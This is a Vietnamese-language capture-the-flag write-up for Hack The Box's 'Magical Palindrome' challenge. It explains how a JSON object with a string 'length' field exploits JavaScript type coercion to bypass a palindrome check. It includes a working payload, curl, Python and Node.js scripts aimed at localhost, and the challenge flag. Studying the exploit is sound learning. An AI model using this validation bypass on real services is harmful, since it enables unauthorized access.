# HTB Magical Palindrome Writeup
---

## Tổng quan

Bài lab trình bày một web service đơn giản nhận JSON payload, kiểm tra xem trường `palindrome` có phải chuỗi đối xứng (palindrome) độ dài ≥ 1000 ký tự hay không. Nếu vượt qua, server trả về flag.

Thay vì gửi chuỗi hợp lệ — vốn bị chặn bởi Nginx do giới hạn kích thước request — ta khai thác loạt lỗ hổng type confusion trong JavaScript để bypass hoàn toàn bằng một object nhỏ gọn.

---

## Phân tích mã nguồn

### Hàm kiểm tra `IsPalinDrome`

```javascript
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(string.length).keys()) {
        const original = string[i];
        const reverse = string[string.length - i - 1];

        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }

    return null;
}
```

**Những điểm đáng chú ý:**

- Tham số được đặt tên là `string` nhưng **không hề có type check** ở đầu hàm.
- Kiểm tra độ dài: `string.length < 1000` — so sánh thuần JavaScript, có thể bị ảnh hưởng bởi coercion.
- Vòng lặp dùng `Array(string.length).keys()` — hành vi thay đổi tùy theo kiểu của `string.length`.
- Truy cập phần tử bằng `string[i]` — hoạt động như object property access, không chỉ string indexing.

### Endpoint POST `/`

```javascript
app.post('/', async (c) => {
    const { palindrome } = await c.req.json();
    const error = IsPalinDrome(palindrome);
    if (error) {
        c.status(400);
        return c.text(error);
    }
    return c.text(`Hii Harry!!! ${flag}`);
});
```

Logic đơn giản: nếu `IsPalinDrome` trả về `null` → flag được trả về.

---

## Phân tích lỗ hổng

### Lỗ hổng 1 — Không kiểm tra kiểu đầu vào

Hàm không gọi `typeof string === 'string'` hay bất kỳ validation nào. Điều này cho phép ta truyền vào một **object** thay vì string — đây là điểm khởi đầu của toàn bộ chain.

---

### Lỗ hổng 2 — Type coercion trong kiểm tra độ dài

```javascript
if (string.length < 1000) { ... }
```

Khi `string` là một object với `length: "1000"` (chuỗi), JavaScript ép kiểu:

```
"1000" < 1000  →  1000 < 1000  →  false
```

Điều kiện bị bypass — server không nhận ra rằng ta chưa cung cấp chuỗi thực sự.

---

### Lỗ hổng 3 — Hành vi dị biệt của `Array()` với chuỗi

```javascript
Array(string.length).keys()
```

| `string.length` | `Array(...)` tạo ra | `.keys()` trả về | Số vòng lặp |
|-----------------|----------------------|------------------|-------------|
| `1000` (số)     | Mảng rỗng, length=1000 | Iterator 0..999 | **1000** lần |
| `"1000"` (chuỗi) | Mảng có 1 phần tử: `["1000"]` | Iterator chỉ có index 0 | **1** lần |

Khi `string.length` là chuỗi `"1000"`, vòng lặp **chỉ chạy đúng 1 lần** với `i = 0`.

---

### Lỗ hổng 4 — Object property access thay vì string indexing

```javascript
const original = string[i];          // string[0]  → thuộc tính "0" của object
const reverse  = string[string.length - i - 1];  // string[999] → thuộc tính "999" của object
```

Khi `string` là object, `string[0]` không đọc ký tự — nó truy xuất **property** có key `"0"`. Ta hoàn toàn kiểm soát giá trị này.

---

## Exploit

### Payload

```json
{
  "palindrome": {
    "length": "1000",
    "0": "A",
    "999": "A"
  }
}
```

Payload chỉ ~50 bytes — hoàn toàn không bị Nginx chặn.

### Chain bypass từng bước

```
❶  Gửi object { length: "1000", "0": "A", "999": "A" }
       ↓
❷  string.length = "1000"
   "1000" < 1000  →  false  →  vượt qua kiểm tra độ dài
       ↓
❸  Array("1000") → ["1000"]  →  .keys() → iterator { 0 }
   Vòng lặp chạy duy nhất 1 lần với i = 0
       ↓
❹  i = 0:
   original = string[0]                    → "A"
   reverse  = string["1000" - 0 - 1]      → string[999] → "A"
       ↓
❺  "A" === "A"        → true
   typeof "A" !== 'string'  → false
   Không lỗi, tiếp tục
       ↓
❻  Vòng lặp kết thúc → hàm return null
   error = null  →  server trả về flag 🎉
```

---

## Gửi payload

**curl:**
```bash
curl -X POST http://localhost:3000/ \
  -H "Content-Type: application/json" \
  -d '{"palindrome": {"length": "1000", "0": "A", "999": "A"}}'
```

**Python:**
```python
import requests

url = "http://localhost:3000/"
payload = {
    "palindrome": {
        "length": "1000",
        "0": "A",
        "999": "A"
    }
}

response = requests.post(url, json=payload)
print(response.text)
```

**Node.js:**
```javascript
fetch('http://localhost:3000/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    palindrome: {
      length: "1000",
      "0": "A",
      "999": "A"
    }
  })
}).then(res => res.text()).then(console.log);
```

---

## Tổng hợp lỗ hổng

| # | Lỗ hổng | Vị trí | Tác động |
|---|---------|--------|----------|
| 1 | Thiếu type validation đầu vào | `IsPalinDrome()` | Cho phép truyền object thay vì string |
| 2 | Type coercion trong so sánh độ dài | `string.length < 1000` | Vượt qua kiểm tra bằng chuỗi `"1000"` |
| 3 | Hành vi dị biệt của `Array(string)` | `Array(string.length)` | Giảm số vòng lặp từ 1000 xuống còn 1 |
| 4 | Object property access thay vì string indexing | `string[i]` | Kiểm soát hoàn toàn giá trị "ký tự" được đọc |
| 5 | Giới hạn kích thước request (Nginx) | Infrastructure | Payload nhỏ gọn (~50 bytes) bypass được |

## Flag
>HTB{Lum0s_M@x!ma}
